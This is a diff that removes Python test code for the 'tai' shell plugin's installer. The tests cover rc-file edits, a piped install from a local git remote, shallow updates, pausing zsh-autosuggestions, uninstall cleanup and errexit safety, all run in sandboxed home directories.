-    assert "✓ zsh installed" not in broken.stdout, broken.stdout
-    assert "! zsh: could not update" in broken.stderr, broken.stderr
-    assert f"source {REPO}/plugins/tai.zsh" in broken.stderr, broken.stderr
-    assert "✓ bash installed" in broken.stdout, broken.stdout
-
-    # Neither rc file writable: there is nothing to exec into, so the command to
-    # copy is withheld and the exit code says the install did not land. Printing
-    # it anyway would promise a live plugin that no shell is configured to load.
-    (pathlib.Path(fake_home) / ".bashrc").unlink()
-    (pathlib.Path(fake_home) / ".bashrc").mkdir()
-    neither = _install(fake_home)
-    assert neither.returncode == 1, neither.returncode
-    assert "✓" not in neither.stdout, neither.stdout
-    assert "→ exec" not in neither.stdout, neither.stdout
-    assert "! bash: could not update" in neither.stderr, neither.stderr
-print("OK — install: two lines and one command, and no ✓ it cannot back up.")
-
-# The one line the readme leads with: curl's output piped into bash. stdin is
-# the installer, $0 is bash itself, and BASH_SOURCE names no file — the piped
-# door this script must open for itself: clone the checkout, then execute the
-# cloned copy so both doors run the same steps. The remote here is the repo
-# itself, so the test needs no network, and TAI_DIR lands the checkout in the
-# sandbox HOME exactly where the real one lands in ~/.tai.
-def _install_piped(home: str, extra_env: dict | None = None) -> subprocess.CompletedProcess:
-    env = _install_env(home)
-    env.update(extra_env or {})
-    with open(f"{REPO}/install.sh", "rb") as script:
-        return subprocess.run(["bash"], stdin=script, env=env,
-                              capture_output=True, text=True, timeout=180)
-
-
-# A remote of the *worktree*: `git clone` takes HEAD, and HEAD does not carry
-# what this test just piped until it is committed — the suite has to pass
-# before that, so the remote is the working tree itself, junk ignored, one
-# throwaway commit with an identity of its own.
-_piped_remote_tmp = tempfile.TemporaryDirectory()
-_piped_remote = f"{_piped_remote_tmp.name}/repo"
-subprocess.run(["git", "init", "-q", "-b", "main", _piped_remote], check=True)
-shutil.copytree(REPO, _piped_remote, dirs_exist_ok=True,
-                ignore=shutil.ignore_patterns(".git", "*.zwc", "__pycache__",
-                                              "node_modules", "dist"))
-subprocess.run(["git", "-C", _piped_remote, "add", "-A"], check=True)
-subprocess.run(["git", "-C", _piped_remote, "-c", "user.email=tai@test",
-                "-c", "user.name=tai", "commit", "-qm", "the worktree, tested"],
-               check=True)
-remote = f"file://{_piped_remote}"
-
-with tempfile.TemporaryDirectory() as piped_home:
-    tai_dir = f"{piped_home}/.tai"
-    done = _install_piped(piped_home, {"TAI_REMOTE": remote,
-                                       "TAI_DIR": tai_dir})
-    assert done.returncode == 0, done.stderr
-    assert "→ cloning tai to" in done.stdout, done.stdout
-    checkout = pathlib.Path(tai_dir)
-    assert (checkout / ".git").is_dir() and (checkout / "install.sh").exists()
-    # The cloned installer's report is the checkout installer's report — the
-    # same ✓ lines, the same welcome, because it is the same script.
-    assert "✓ zsh installed" in done.stdout and "✓ bash installed" in done.stdout, done.stdout
-    assert "the terminal that knows your next command" in done.stdout, done.stdout
-    rc = (pathlib.Path(piped_home) / ".zshrc").read_text()
-    assert f"source {checkout}/plugins/tai.zsh" in rc, rc
-    assert (pathlib.Path(piped_home) / "bin" / "tai").exists(), "the wrapper went with it"
-
-    # A second piped run updates the checkout in place — the one-liner is the
-    # update path too, which is what makes `tai update` and the pipe agree on
-    # where the code lives.
-    again = _install_piped(piped_home, {"TAI_REMOTE": remote, "TAI_DIR": tai_dir})
-    assert again.returncode == 0, again.stderr
-    assert "→ updating the checkout at" in again.stdout, again.stdout
-
-    # The update is one commit deep, not a pull that re-downloads every commit
-    # the remote gained since the checkout was cut: the clone is shallow and
-    # the refetch keeps it that way.
-    shallow = subprocess.run(["git", "-C", tai_dir, "rev-parse",
-                              "--is-shallow-repository"],
-                             capture_output=True, text=True)
-    assert shallow.stdout.strip() == "true", shallow.stdout + shallow.stderr
-
-    # The remote moves, and the next run carries the checkout with it — still
-    # one commit deep, sitting on exactly the commit the remote names.
-    subprocess.run(["git", "-C", _piped_remote, "-c", "user.email=tai@test",
-                    "-c", "user.name=tai", "commit", "-qm", "the second word",
-                    "--allow-empty"], check=True)
-    third = _install_piped(piped_home, {"TAI_REMOTE": remote, "TAI_DIR": tai_dir})
-    assert third.returncode == 0, third.stderr
-    tip = subprocess.run(["git", "-C", _piped_remote, "rev-parse", "HEAD"],
-                         capture_output=True, text=True).stdout.strip()
-    at = subprocess.run(["git", "-C", tai_dir, "rev-parse", "HEAD"],
-                        capture_output=True, text=True).stdout.strip()
-    assert at == tip, f"{at} != {tip}"
-    still = subprocess.run(["git", "-C", tai_dir, "rev-parse",
-                            "--is-shallow-repository"],
-                           capture_output=True, text=True)
-    assert still.stdout.strip() == "true", still.stdout + still.stderr
-
-    # A directory that is there but is not a checkout is named, never clobbered.
-    occupied = pathlib.Path(piped_home) / "occupied"
-    occupied.mkdir()
-    blocked = _install_piped(piped_home, {"TAI_REMOTE": remote, "TAI_DIR": str(occupied)})
-    assert blocked.returncode == 1, blocked.stdout
-    assert "not a tai checkout" in blocked.stderr, blocked.stderr
-
-    # Uninstall takes the checkout with it: the clone is the code itself, and
-    # leaving it behind would leave the program installed in every way but the
-    # wrapper. Same redirect discipline as every other door — a subprocess in
-    # the sandbox HOME, never this process — and no TAI_DIR, so the default
-    # ~/.tai path under HOME is the one being exercised.
-    gone = subprocess.run(["python3", f"{REPO}/tai/cli.py", "uninstall"],
-                          env=_install_env(piped_home), capture_output=True,
-                          text=True, timeout=60)
-    assert gone.returncode == 0, gone.stderr
-    assert "tai removed" in gone.stdout, gone.stdout
-    assert not checkout.exists(), "the checkout the pipe cloned went with it"
-    assert not (pathlib.Path(piped_home) / "bin" / "tai").exists(), gone.stdout
-
-# A checkout that predates --depth 1 — a full clone from the era when the
-# readme taught git clone by hand — is healed by the same update rather than
-# re-pulled commit by commit forever: after one run the tree is shallow and
-# carries nothing older than its tip.
-with tempfile.TemporaryDirectory() as fat_home:
-    fat_dir = f"{fat_home}/.tai"
-    subprocess.run(["git", "clone", "-q", remote, fat_dir], check=True)
-    fat = _install_piped(fat_home, {"TAI_REMOTE": remote, "TAI_DIR": fat_dir})
-    assert fat.returncode == 0, fat.stderr
-    assert "→ updating the checkout at" in fat.stdout, fat.stdout
-    slim = subprocess.run(["git", "-C", fat_dir, "rev-parse",
-                           "--is-shallow-repository"],
-                          capture_output=True, text=True)
-    assert slim.stdout.strip() == "true", slim.stdout + slim.stderr
-print("OK — the one-line install: clones, installs, updates one commit deep, "
-      "and asks before overwriting.")
-
-# Everything below speaks to a real zsh: the pause is install.sh editing a
-# zshrc, which it only does when zsh itself is present, and the errexit checks
-# source the plugin in one. A machine without zsh skips from here instead of
-# failing — the rest of tests/test.sh still runs, which is the deal it offers
-# a bash-only box.
-if not zsh_bin():
-    print("SKIP — the remaining install checks need the zsh binary; none here.")
-    sys.exit(0)
-
-# zsh-autosuggestions, which Manjaro's prompt loads for you. The installer pauses
-# it and `tai uninstall` gives it back, so both halves are exercised here: a block
-# added but never removed is a user's shell quietly configured differently from how
-# they left it.
-with tempfile.TemporaryDirectory() as fake_home:
-    zshrc = pathlib.Path(fake_home) / ".zshrc"
-    # A plugin file and a line that loads it, which is the shape the pause has to
-    # work with: the line is in a file the user did not write, so commenting it out
-    # is not available and removing its hook is.
-    plugin = pathlib.Path(fake_home) / "autosuggestions.zsh"
-    plugin.write_text("_zsh_autosuggest_start() { : }\n"
-                      "autoload -Uz add-zsh-hook\n")
-    zshrc.write_text(f"source {plugin}\n")
-    env = sandbox_env(fake_home, {"ZDOTDIR": fake_home,
-                                  "TAI_KEEP_AUTOSUGGEST": "0"})
-    done = subprocess.run(["bash", f"{REPO}/install.sh"], env=env,
-                          capture_output=True, text=True, timeout=120)
-    assert done.returncode == 0, done.stderr
-    text = zshrc.read_text()
-    assert "# tai: zsh-autosuggestions paused" in text, text
-    assert "add-zsh-hook -d precmd _zsh_autosuggest_start" in text, text
-    # The user's own line is untouched: this pauses the plugin, it does not
-    # rewrite someone's configuration.
-    assert f"source {plugin}" in text, text
-    assert "✓ zsh-autosuggestions paused" in done.stdout, done.stdout
-    # Idempotent: a second install replaces the block rather than stacking copies.
-    again = subprocess.run(["bash", f"{REPO}/install.sh"], env=env,
-                           capture_output=True, text=True, timeout=120)
-    assert again.returncode == 0, again.stderr
-    assert zshrc.read_text().count("_zsh_autosuggest_start") == 1, zshrc.read_text()
-    # And the opt-out is honoured, because a user who wants both plugins keeps
-    # both: the line is only ever a suggestion about which hint you see.
-    keep = dict(env, TAI_KEEP_AUTOSUGGEST="1")
-    subprocess.run(["bash", f"{REPO}/install.sh"], env=keep,
-                   capture_output=True, text=True, timeout=120)
-    kept_text = zshrc.read_text()
-    assert "add-zsh-hook -d precmd _zsh_autosuggest_start" not in kept_text, kept_text
-
-    # Uninstall gives the plugin back, and leaves the user's own line alone.
-    # Run as a subprocess with the same redirects as the installer, and never by
-    # calling `cmd_uninstall` in this process: that reads HOME, XDG_DATA_HOME and
-    # TAI_DATA_DIR out of *this* environment, so an in-process call removes the
-    # developer's own database, indexes and dotfile rather than the sandbox's.
-    tai_env = dict(env, TAI_DATA_DIR=f"{fake_home}/share/tai")
-    uninstalled = subprocess.run(
-        ["python3", f"{REPO}/tai/cli.py", "uninstall"], env=tai_env,
-        capture_output=True, text=True, timeout=60)
-    assert uninstalled.returncode == 0, uninstalled.stderr
-    after = zshrc.read_text()
-    assert "autosuggestions paused" not in after, after
-    assert "_zsh_autosuggest_start" not in after, after
-    assert f"source {plugin}" in after, after
-    assert "plugins/tai.zsh" not in after, after
-    assert not pathlib.Path(tai_env["TAI_DATA_DIR"]).exists(), "the data went too"
-print("OK — install pauses zsh-autosuggestions, uninstall gives it back.")
-
-# The plugin is a guest in the user's rc file, so it must survive — and not
-# damage — a shell that has `set -e` before it. It did not survive: the load
-# called zsh's own `add-zle-hook-widget`, whose internal `(( del ))` returns
-# false on a shell with no such hook yet, and errexit ended the *session* on the
-# last line of a file the user never edited. `plugins/tai.zsh` suspends errexit
-# for the load and restores it.
-#
-# Three things to assert, and the third is the one that would be easy to get
-# wrong: a guard that quietly leaves `set -e` off afterwards would be a worse bug
-# than the one it prevents. Real shells, the real index, and the real plugin.
-_errexit_home = f"{fake_home}/errexit"
-os.makedirs(_errexit_home, exist_ok=True)
-_errexit_env = dict(env, HOME=_errexit_home, TAI_INDEX=f"{_errexit_home}/zsh-index.zsh",
-                    TAI_HISTORY_FILES="")
-assert tai_index.build() > 0, "nothing to load"
-_loaded = subprocess.run(
-    ["zsh", "-f", "-c", f"set -e; source {REPO}/plugins/tai.zsh; print REACHED-END"],
-    env=_errexit_env, capture_output=True, text=True, timeout=60)
-assert "REACHED-END" in _loaded.stdout, f"set -e killed the shell: {_loaded.stderr}"
-_still_on = subprocess.run(
-    ["zsh", "-f", "-c", f"set -e; source {REPO}/plugins/tai.zsh; false; print LEAKED"],
-    env=_errexit_env, capture_output=True, text=True, timeout=60)
-assert "LEAKED" not in _still_on.stdout, "the plugin left errexit off in the user's shell"
-_plain = subprocess.run(["zsh", "-f", "-c", f"source {REPO}/plugins/tai.zsh; print REACHED-END"],
-                        env=_errexit_env, capture_output=True, text=True, timeout=60)
-assert "REACHED-END" in _plain.stdout and _plain.stderr == "", _plain.stderr
-print("OK — a shell with `set -e` loads the plugin and keeps its own setting.")
-
-# The same guest rule for bash, which is the shell most likely to be sourced
-# from a `set -e` rc file. Both halves, exactly like the zsh one: the load
-# survives errexit, and errexit is still on afterwards to kill a real failure.
-_b_loaded = subprocess.run(
-    ["bash", "--noprofile", "--norc", "-c",
-     f"set -e; source {REPO}/plugins/tai.bash; echo REACHED-END"],
-    env=_errexit_env, capture_output=True, text=True, timeout=60)
-assert "REACHED-END" in _b_loaded.stdout, f"set -e killed bash: {_b_loaded.stderr}"
-_b_still_on = subprocess.run(
-    ["bash", "--noprofile", "--norc", "-c",
-     f"set -e; source {REPO}/plugins/tai.bash; false; echo LEAKED"],
-    env=_errexit_env, capture_output=True, text=True, timeout=60)
-assert "LEAKED" not in _b_still_on.stdout, "the bash plugin left errexit off"
-print("OK — bash under `set -e` loads the plugin and keeps its own setting.")
-
-# "A shell parameter is not an environment variable; a plugin is the only
-# bridge." HISTFILE is set, not exported, so every tai subprocess used to see
-# nothing and `tai refresh` imported only the default paths. The plugin is the
-# one place that knows the file, so it exports TAI_HISTORY_FILES at load time —
-# but only when the user has not already said it themselves. printenv reads the
-# environment, which is the thing the rule is about.
-_hist_env = dict(_errexit_env)
-_hist_env.pop("TAI_HISTORY_FILES", None)
-_hist_val = f"{_errexit_home}/.zhistory"
-_z_hist = subprocess.run(
-    ["zsh", "-f", "-c",
-     f"HISTFILE={_hist_val}; source {REPO}/plugins/tai.zsh; printenv TAI_HISTORY_FILES"],
-    env=_hist_env, capture_output=True, text=True, timeout=60)
-assert _z_hist.stdout.strip() == _hist_val, \
-    f"the zsh plugin did not export HISTFILE: {_z_hist.stdout!r} {_z_hist.stderr}"
-_hist_val_b = f"{_errexit_home}/.bash_history"
-_b_hist = subprocess.run(
-    ["bash", "--noprofile", "--norc", "-c",
-     f"HISTFILE={_hist_val_b}; source {REPO}/plugins/tai.bash; printenv TAI_HISTORY_FILES"],
-    env=_hist_env, capture_output=True, text=True, timeout=60)
-assert _b_hist.stdout.strip() == _hist_val_b, \
-    f"the bash plugin did not export HISTFILE: {_b_hist.stdout!r} {_b_hist.stderr}"
-_kept = subprocess.run(
-    ["bash", "--noprofile", "--norc", "-c",
-     f"HISTFILE={_hist_val_b}; source {REPO}/plugins/tai.bash; printenv TAI_HISTORY_FILES"],
-    env=dict(_hist_env, TAI_HISTORY_FILES="mine"),
-    capture_output=True, text=True, timeout=60)
-assert _kept.stdout.strip() == "mine", \
-    f"the plugin overwrote what the user said: {_kept.stdout!r}"
-print("OK — the plugins export TAI_HISTORY_FILES once, and only when unset.")
+print()
+if failures:
+    print(f"FAILED ({len(failures)}) — fix and re-run")
+    for f in failures:
+        print("  -", f)
+    sys.exit(1)
+print("OK — install, wiring, retarget, autosuggest, uninstall, index rules, JEV gate.")
